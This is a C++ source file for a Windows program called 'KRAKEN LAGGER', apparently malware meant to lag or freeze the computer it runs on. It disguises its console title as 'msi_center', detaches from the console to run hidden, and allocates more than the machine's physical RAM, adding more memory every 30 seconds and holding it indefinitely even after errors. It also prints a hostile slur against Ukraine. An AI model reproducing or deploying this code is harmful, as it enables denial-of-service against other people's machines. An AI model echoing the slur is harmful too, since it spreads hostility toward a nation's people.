#include <iostream>
#include <vector>
#include <new>
#include <cstdlib>
#include <cstddef>
#include <chrono>
#include <thread>
#include <random>
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <memoryapi.h>

void setProcessName() {
    SetConsoleTitleA("msi_center");
}

void setConsoleColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void resetConsoleColor() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 7);
}

void printTypewriterText(const std::string& text) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 5);

    for (char c : text) {
        setConsoleColor(dis(gen));
        std::cout << c << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    resetConsoleColor();
    std::cout << std::endl;
}

void printAsciiArt() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 5);

    const char* art[] = {
        "             ;::::; ",
        "           ;::::; :; ",
        "         ;:::::'   :; ",
        "        ;:::::;     ;. ",
        "       ,:::::'       ;           OOO\\ ",
        "       ::::::;       ;          OOOOO\\ ",
        "       ;:::::;       ;         OOOOOOOO ",
        "      ,;::::::;     ;'         / OOOOOOO ",
        "    ;:::::::::`. ,,,;.        /  / DOOOOOO ",
        "  .';:::::::::::::::::;,     /  /     DOOOO ",
        ",::::::;::::::;;;;::::;,   /  /        DOOO ",
        ";`::::::`'::::::;;;::::: ,#/  /          DOOO ",
        ":`:::::::`;::::::;;::: ;::#  /            DOOO ",
        "::`:::::::`;:::::::: ;::::# /              DOO ",
        "`:`:::::::`;:::::: ;::::::#/               DOO ",
        ":::`:::::::`;; ;:::::::::##                OO ",
        "::::`:::::::`;::::::::;:::#                OO ",
        "`:::::`::::::::::::;'`:;::#                O ",
        "  `:::::`::::::::;' /  / `:# ",
        "   ::::::`:::::;'  /  /   `# "
    };

    for (const char* line : art) {
        setConsoleColor(dis(gen));
        std::cout << line << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    resetConsoleColor();
}

void detachFromConsole() {
    FreeConsole();
}

size_t getTotalSystemMemory() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    return memInfo.ullTotalPhys;
}

std::string formatBytes(size_t bytes) {
    const char* units[] = { "B", "KB", "MB", "GB" };
    int unit = 0;
    double size = static_cast<double>(bytes);

    while (size >= 1024 && unit < 3) {
        size /= 1024;
        unit++;
    }

    std::ostringstream oss;
    oss << std::fixed << std::setprecision(2) << size << " " << units[unit];
    return oss.str();
}

int main() {
    setProcessName();

    printAsciiArt();
    printTypewriterText("KRAKEN LAGGER");
    std::cout << "=== Fuck ukraine! ===" << std::endl;

    size_t totalSystemMemory = getTotalSystemMemory();
    size_t totalSystemMemoryMB = totalSystemMemory / (1024 * 1024);
    size_t targetMemoryMB = (totalSystemMemoryMB * 105) / 100; // 105% RAM

    setConsoleColor(4); 
    std::cout << "WARNING: The Kraken will choke yer system with "
        << formatBytes(targetMemoryMB * 1024 * 1024)
        << " of memory, causin' eternal lag, matey! :)" << std::endl;
    resetConsoleColor();
    std::cout << "Press Enter to release the beast and run in the shadows...";
    std::cin.get();

    detachFromConsole();
    std::vector<std::vector<char>*> allocatedBlocks;
    size_t allocatedMB = 0;

    try {
        // Initial allocation: 105% of physical RAM in 500MB chunks
        while (allocatedMB < targetMemoryMB) {
            size_t chunkSize = targetMemoryMB - allocatedMB;
            if (chunkSize > 500) chunkSize = 500; // 500MB chunks
            std::vector<char>* block = new std::vector<char>(chunkSize * 1024 * 1024);
            for (size_t i = 0; i < block->size(); i += 4096) {
                (*block)[i] = static_cast<char>(rand() % 256);
            }
            allocatedBlocks.push_back(block);
            allocatedMB += chunkSize;
        }

        // Gradual increase: Add 10MB every 30 seconds
        while (true) {
            try {
                std::vector<char>* extraBlock = new std::vector<char>(10 * 1024 * 1024); // 10MB
                for (size_t i = 0; i < extraBlock->size(); i += 4096) {
                    (*extraBlock)[i] = static_cast<char>(rand() % 256);
                }
                allocatedBlocks.push_back(extraBlock);
                allocatedMB += 10;
            }
            catch (const std::bad_alloc&) {
                // Stop adding more if allocation fails
            }
            Sleep(30000); // 30 seconds
        }
    }
    catch (...) {
        // Continue holding memory despite errors
        while (true) {
            Sleep(60000); // 60 seconds
        }
    }

    // Unreachable
    for (auto* block : allocatedBlocks) {
        delete block;
    }
    return 0;
}
